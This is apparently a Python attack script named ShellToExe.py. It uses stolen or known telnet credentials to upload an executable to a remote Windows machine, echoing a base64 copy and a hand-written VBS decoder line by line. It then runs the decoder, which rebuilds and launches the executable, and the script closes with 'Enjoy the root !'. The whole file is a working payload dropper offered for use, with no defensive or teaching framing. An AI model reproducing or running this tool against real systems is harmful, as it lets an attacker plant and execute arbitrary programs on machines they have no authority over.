#This script is to be used when you have a windows remote shell (typically telnet) and you can wite data in files
#using the following syntax : "echo whatever >> my_file"
#The script first encode an exe into a base64 file, send it on the remote computer and then send a vbs script
#that will be used to decode the base64 file.
#We will then get an executable that we will launch remotely

#Some libraries
import os
import sys
import telnetlib
import subprocess
import time

#We need four options to run the script
if len(sys.argv) != 5 :
	print("Usage : python3 ShellToExe.py executable.exe target username password\n")
	print("The executable.exe will be encoded into base64 and then transfered to the remote computer\n")
	print("For a 50Ko file it will take approximately an hour.\n")
	exit()

#Name of the .exe
executable = sys.argv[1]
#Name of the base64encoded .exe
base64name = executable.replace(".exe" , ".b64")
#Name of the vbs script used to decode
vbsScriptName = "decodeb64.vbs"
#IP target
target = sys.argv[2]
#Username to log to telnet
username = sys.argv[3]
#Password to log to telnet
password = sys.argv[4]

print("[-] Selected executable is : {}".format(executable))
print("[-] Encoding {} into base64 file ({})...".format(executable,base64name))
try :
	os.system("base64 {} > {}".format(executable, base64name))
except :
	sys.exit("[!] Encoding failed... Exiting.")


print("[-] Encoding done. Writing VBS script into {} file".format(vbsScriptName))

#This it the hardcoded vbs script that i write in a file called decodeb64..vbs
#It does nothing more than decoding base64 encoded .exe and run it
file = open(vbsScriptName, "w+")
vbsscript = '''Set fs = CreateObject("Scripting.FileSystemObject")
Set file = fs.GetFile("{}")
If file.Size Then
Set fd = fs.OpenTextFile("{}", 1)
data = fd.ReadAll
data = Replace(data, vbCrLf, "")
data = base64_decode(data)
fd.Close
Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("{}", 2, True)
ofs.Write data
ofs.close
Set shell = CreateObject("Wscript.Shell")
shell.run ("{}")
Else
Wscript.Echo "The file is empty."
End If
Function base64_decode(byVal strIn)
Dim w1, w2, w3, w4, n, strOut
For n = 1 To Len(strIn) Step 4
w1 = mimedecode(Mid(strIn, n, 1))
w2 = mimedecode(Mid(strIn, n + 1, 1))
w3 = mimedecode(Mid(strIn, n + 2, 1))
w4 = mimedecode(Mid(strIn, n + 3, 1))
If Not w2 Then _
strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255))
If  Not w3 Then _
strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255))
If Not w4 Then _
strOut = strOut + Chr(((w3 * 64 + w4) And 255))
Next
base64_decode = strOut
End Function
Function mimedecode(byVal strIn)
Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
If Len(strIn) = 0 Then
mimedecode = -1 : Exit Function
Else
mimedecode = InStr(Base64Chars, strIn) - 1
End If
End Function
'''.format(base64name, base64name, executable, executable)
file.write(vbsscript)
file.close()

print("[!] Connecting to Telnet on {}...".format(target))
#Initiating the connection to the targer on port 23
tn = telnetlib.Telnet(target, 23)
tn.set_debuglevel(10)
#Read the output till we are asked to enter a login
tn.read_until(b"ogin: ")
#We send our username and \r which is used to simulate the enter key
tn.write(username.encode('ascii')+ b"\r")
#We wait for 2 secondes in order to avoid output/input flaw to merge
time.sleep(2)
#If you specify a password then we repeat the previous options 
if password:
	tn.read_until(b"assword: ")
	time.sleep(2)
	tn.write(password.encode('ascii')+ b"\r")
tn.read_until(b"Server.", 5)
print("[-] Connected to Telnet server. Sending {}...".format(vbsScriptName))

#Before doing anything, we delete files that might already exists
tn.write("del {}".format(vbsScriptName).encode('ascii') + b"\r")
time.sleep(2)
#And then we create the new file we will use
tn.write("copy NUL {}".format(vbsScriptName).encode('ascii') + b"\r")
time.sleep(2)

#Now we open our vbs script in reading mode
script = open(vbsScriptName,"r")
#For each line in this script :
for line in script.readlines():
	print("echo {} >> {}".format(line, vbsScriptName))
	#We write it in our telnet session using the following syntax : echo whatever >> our_file
	tn.write("echo {} >> {} ".format(line,vbsScriptName).encode('ascii') + b"\r")
	#And once again we wait 2 seconds to avoid crashs
	time.sleep(2)
script.close()

print("[-] VBS script sent. Sending base64 encoded executable...")

#We delete files that might already exists
tn.write("del {}".format(base64name).encode('ascii') + b"\r")
time.sleep(2)
#And create the one we will use
tn.write("copy NUL {}".format(base64name).encode('ascii') + b"\r")
time.sleep(2)

#Now we send our base64 encoded executable
contents = ""
count = 0
tailleenvoyee = 0
#Used to retrieve the size of our base64 encoded executable
tailletotale = subprocess.getoutput("ls -l {} | grep {} | cut -d ' ' -f5".format(base64name,base64name))
base64encodedexecutable = open(base64name,"r")
for line in base64encodedexecutable.readlines():
	line = line.replace("\n","")
	#We send datas 10 lines after 10 lines
	contents += line
	if count == 10 :
		tailleenvoyee = tailleenvoyee + len(contents)
		tn.write("echo {}>>{}\r".format (contents, base64name).encode('ascii'))
		#Since we are sending way more datas, we need to temporize the buffers
		time.sleep(45)
		print("\nSent {}/{}bytes.\n".format(tailleenvoyee, tailletotale))
		count = 0
		contents = ""
	count = count + 1
tn.write("echo {}>>{}\r".format (contents, base64name).encode('ascii'))
time.sleep(45)
base64encodedexecutable.close()

#Files are sent, we can now decode the base64 exe using the vbs script
#To do so, we launche the vbs script using this command : cscript name_vbsscript
print("[-]Base64 encoded executable sent. Launching exploit...")
tn.write("cscript {}".format(vbsScriptName).encode('ascii')+ (b"\r"))
time.sleep(10)
print("[-]Executable launched. Enjoy the root !")
#We close the telnet session
tn.close()
#And read the last ouput sent by the telnet session
print(tn.read_all())
